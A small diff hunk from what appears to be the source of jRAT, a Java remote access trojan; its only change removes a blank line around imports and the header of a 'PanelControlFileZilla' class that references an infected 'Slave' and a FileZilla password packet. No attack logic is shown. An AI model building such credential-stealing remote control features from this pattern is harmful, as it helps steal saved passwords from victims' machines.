@@ -17,7 +17,6 @@ import javax.swing.table.DefaultTableModel;
 import pro.jrat.Slave;
 import pro.jrat.packets.outgoing.Packet68FileZillaPassword;
 
-
 @SuppressWarnings("serial")
 public class PanelControlFileZilla extends PanelControlParent {
 
